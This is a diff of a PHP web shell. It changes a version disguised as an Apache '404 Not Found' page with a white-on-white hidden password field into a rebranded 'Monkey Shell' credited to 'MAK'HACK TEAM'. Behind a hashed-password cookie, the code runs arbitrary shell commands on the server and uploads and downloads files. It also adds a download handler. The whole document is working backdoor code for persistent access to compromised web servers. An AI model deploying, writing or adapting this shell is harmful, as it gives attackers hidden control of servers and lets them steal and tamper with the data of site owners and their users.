@@ -1,37 +1,120 @@
 <?php
-//Author : SourceCode347
-//Website : sourcecode347.com
-$md5pass="00bd542d259ffb1362201ea1bd3c12df";
-if(isset($_POST['hiddenpass'])){
-    //echo md5(md5(md5($_POST['hiddenpass']))); //md5pass generator
-    if (md5(md5(md5($_POST['hiddenpass'])))==$md5pass){
-		setcookie('log', md5(md5(md5(md5($_POST['hiddenpass'])))) , time()+60*60*12, "/");
-		header('Location: notfound.php');
+//Author : MAK'HACK TEAM
+
+
+// Change this
+// $md5pass = "00bd542d259ffb1362201ea1bd3c12df";
+$md5pass = "792287063315eab7e08b10f8dd349ded";
+if (isset($_POST['hiddenpass'])) {
+    if (md5(md5(md5($_POST['hiddenpass']))) == $md5pass) {
+        setcookie('log', md5(md5(md5(md5($_POST['hiddenpass'])))), time() + 60 * 60 * 12, "/");
+        header('Location: monkeyshell.php');
     }
 }
-if( (isset($_POST['logout'])) or (isset($_GET['logout'])) ){
-	setcookie('log', '', time()-7000000, "/");
-    header('Location: notfound.php');
+
+if ((isset($_POST['logout'])) or (isset($_GET['logout']))) {
+    setcookie('log', '', time() - 7000000, "/");
+    header('Location: monkeyshell.php');
 }
-if(!isset($_COOKIE['log'])){
-    echo '
+
+if (!isset($_COOKIE['log'])) {
+    echo <<<XML
     <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
-    <html><head>
-    <title>404 Not Found</title>
-    </head><body>
-    <h1>Not Found</h1>
-    <p>The requested URL was not found on this server.</p>
-    <hr>
-    <address>Apache/2.4.54 (Ubuntu) Server at '.$_SERVER['SERVER_ADDR'].' Port 80</address>
-    <form action="notfound.php" method="POST">
-        <input type="password" name="hiddenpass" style="border: 1px #FFFFFF solid;background-color:#FFFFFF;color:#FFFFFF;bottom:0px;right:0px;position:fixed;"/>
-        <input type="submit" value="submit" style="border: 1px #FFFFFF solid;background-color:#FFFFFF;color:#FFFFFF;bottom:0px;right:200px;position:fixed;"/>
-    </form>
-    </body></html>';
+    <html>
+        <head>
+            <title>MONKEY</title>
+            <style>
+                body {
+                    background: #333;;
+                    color: #00FF00;
+                    font-family: "Courier New", Courier, monospace;
+                    height: 95%;
+                }
+                .main {
+                    height: 95%;
+                    width: 100%;
+                    display: table;
+                }
+
+                .wrapper {
+                    display: table-cell;
+                    height: 100%;
+                    vertical-align: middle;
+                }
+                #shell-logo {
+                    font-weight: bold;
+                    color: #FF4180;
+                    text-align: center;
+                }
+                .logo {
+                    border-radius: 50%;
+                    width: 250px;
+                    height: 250px;
+                }
+                h1 {
+                    text-align: center;
+                    color: #FF4180;
+                }
+
+                form {
+                    text-align: center;
+                    margin-top: 20px;
+                    
+                }
+                input[type=password] {
+                    background: #333;
+                    color: #00FF00;
+                    border-radius: 5px;
+                    border: none;
+                    padding: 5px;
+                    width: 200px;
+                    font-size: 20px;
+                    text-align: center;
+                    display: block;
+                    margin-left: auto;
+                    margin-right: auto;
+
+                    box-shadow: rgba(0, 0, 0, 0.24) 0px 3px 8px;
+
+                }
+                input[type=submit] {
+                    background: #333;
+                    color: #00FF00;
+                    border:none;
+                    border-radius: 5px;
+                    padding: 5px;
+                    width: 200px;
+                    font-weight: bold;
+                    font-size: 20px;
+                    text-align: center;
+                    display: block;
+                    margin-left: auto;
+                    margin-right: auto;
+                    margin-top: 10px;
+                }
+            </style>
+        </head>
+        <body>
+        <div class="main">
+        <div class="wrapper">
+            <h1>MONKEY SHELL</h1>
+            <div id="shell-logo">
+                <img src="https://i.ibb.co/Jx9rcyV/MAK-HACK-TEAM-Imgur.gif" alt="MAK-HACK" border="0" class="logo">
+            </div>
+            <form action="monkeyshell.php" method="post">
+                <input type="password" name="hiddenpass" placeholder="Password" autocomplete="off">
+                <input type="submit" value="Login">
+            </form>
+            </div>
+        </div>
+        </body>
+    </html>
+    XML;
 }
-if ( (isset($_COOKIE['log'])) and ($_COOKIE['log']==md5($md5pass)) ){
-    //echo "you are logged in";
-    function featureShell($cmd, $cwd) {
+
+if ((isset($_COOKIE['log'])) && ($_COOKIE['log'] == md5($md5pass))) {
+    function featureShell($cmd, $cwd)
+    {
         $stdout = array();
 
         if (preg_match("/^\s*cd\s*$/", $cmd)) {
@@ -55,11 +138,13 @@ if ( (isset($_COOKIE['log'])) and ($_COOKIE['log']==md5($md5pass)) ){
         );
     }
 
-    function featurePwd() {
+    function featurePwd()
+    {
         return array("cwd" => getcwd());
     }
 
-    function featureHint($fileName, $cwd, $type) {
+    function featureHint($fileName, $cwd, $type)
+    {
         chdir($cwd);
         if ($type == 'cmd') {
             $cmd = "compgen -c $fileName";
@@ -73,7 +158,8 @@ if ( (isset($_COOKIE['log'])) and ($_COOKIE['log']==md5($md5pass)) ){
         );
     }
 
-    function featureDownload($filePath) {
+    function featureDownload($filePath)
+    {
         $file = @file_get_contents($filePath);
         if ($file === FALSE) {
             return array(
@@ -88,7 +174,8 @@ if ( (isset($_COOKIE['log'])) and ($_COOKIE['log']==md5($md5pass)) ){
         }
     }
 
-    function featureUpload($path, $file, $cwd) {
+    function featureUpload($path, $file, $cwd)
+    {
         chdir($cwd);
         $f = @fopen($path, 'wb');
         if ($f === FALSE) {
@@ -108,7 +195,7 @@ if ( (isset($_COOKIE['log'])) and ($_COOKIE['log']==md5($md5pass)) ){
 
     if (isset($_GET["feature"])) {
 
-        $response = NULL;
+        $response = null;
 
         switch ($_GET["feature"]) {
             case "shell":
@@ -126,7 +213,9 @@ if ( (isset($_COOKIE['log'])) and ($_COOKIE['log']==md5($md5pass)) ){
                 break;
             case 'upload':
                 $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
-                
+            case 'download':
+                $response = featureDownload($_POST['path']);
+                break;
         }
 
         header("Content-Type: application/json");
@@ -141,7 +230,7 @@ if ( (isset($_COOKIE['log'])) and ($_COOKIE['log']==md5($md5pass)) ){
 
         <head>
             <meta charset="UTF-8" />
-            <title>NotFound@Shell:~#</title>
+            <title>Monkey@Shell:~#</title>
             <meta name="viewport" content="width=device-width, initial-scale=1.0" />
             <style>
                 html, body {
@@ -150,6 +239,11 @@ if ( (isset($_COOKIE['log'])) and ($_COOKIE['log']==md5($md5pass)) ){
                     background: #333;
                     color: #eee;
                     font-family: monospace;
+                }
+                h1 {
+                    text-align: center;
+                    color: #FF4180;
+                    margin-top: 100px;
                 }
 
                 *::-webkit-scrollbar-track {
@@ -297,7 +391,8 @@ if ( (isset($_COOKIE['log'])) and ($_COOKIE['log']==md5($md5pass)) ){
                     if (/^\s*upload\s+[^\s]+\s*$/.test(command)) {
                         featureUpload(command.match(/^\s*upload\s+([^\s]+)\s*$/)[1]);
                     } else if (/^\s*clear\s*$/.test(command)) {
-                        // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer
+                        // Backend shell TERM environment variable not set.
+                        // Clear command history from UI but keep in buffer
                         eShellContent.innerHTML = '';
                     } else if (/^\s*logout\s*$/.test(command)) {
                         featureLogout();
@@ -380,7 +475,7 @@ if ( (isset($_COOKIE['log'])) and ($_COOKIE['log']==md5($md5pass)) ){
                 }
                 function featureLogout() {
                     var element = document.createElement('a');
-                    element.setAttribute('href', 'notfound.php?logout=logout');
+                    element.setAttribute('href', 'monkeyshell.php?logout=logout');
                     document.body.appendChild(element);
                     element.click();
                 }
@@ -401,7 +496,7 @@ if ( (isset($_COOKIE['log'])) and ($_COOKIE['log']==md5($md5pass)) ){
                         var splittedCwd = cwd.split("/");
                         shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
                     }
-                    return "NotFound@Shell:<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
+                    return "Monkey@Shell:<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
                 }
 
                 function updateCwd(cwd) {
@@ -521,24 +616,19 @@ if ( (isset($_COOKIE['log'])) and ($_COOKIE['log']==md5($md5pass)) ){
         </head>
 
         <body>
+            <h1>Monkey Shell</h1>
             <div id="shell">
                 <pre id="shell-content">
                     <div id="shell-logo">
-                  __      ___                          __     <span></span>
-                 /\ \__ /'___\                        /\ \    <span></span>
-      ___     ___\ \ ,_/\ \__/  ___   __  __   ___    \_\ \   <span></span>
-    /' _ `\  / __`\ \ \\ \ ,__\/ __`\/\ \/\ \/' _ `\  /'_` \  <span></span>
-    /\ \/\ \/\ \L\ \ \ \\ \ \_/\ \L\ \ \ \_\ /\ \/\ \/\ \L\ \ <span></span>
-    \ \_\ \_\ \____/\ \__\ \_\\ \____/\ \____\ \_\ \_\ \___,_\<span></span>
-     \/_/\__/\/___/  \/______/ _____/  \/___/ \/_/\/_/\/__,_ /<span></span>
-         /\ \           /\_ \ /\_ \                           <span></span>
-      ___\ \ \___      _\//\ \\//\ \                          <span></span>
-     /',__\ \  _ `\  /'__`\ \ \ \ \ \                         <span></span>
-    /\__, `\ \ \ \ \/\  __/\_\ \_\_\ \_                       <span></span>
-    \/\____/\ \_\ \_\ \____/\____/\____\                      <span></span>
-     \/___/  \/_/\/_/\/____\/____\/____/                      <span></span>
-                                                              <span></span>
-                                                              <span></span>
+         __  __             _               _____ _          _ _ <span></span>
+        |  \/  |           | |             / ____| |        | | |<span></span>
+        | \  / | ___  _ __ | | _____ _   _| (___ | |__   ___| | |<span></span>
+        | |\/| |/ _ \| '_ \| |/ / _ \ | | |\___ \| '_ \ / _ \ | |<span></span>
+        | |  | | (_) | | | |   <  __/ |_| |____) | | | |  __/ | |<span></span>
+        |_|  |_|\___/|_| |_|_|\_\___|\__, |_____/|_| |_|\___|_|_|<span></span>
+                                    __/ |                        <span></span>
+                                    |___/                        <span></span>
+
                     </div>
                 </pre>
                 <div id="shell-input">
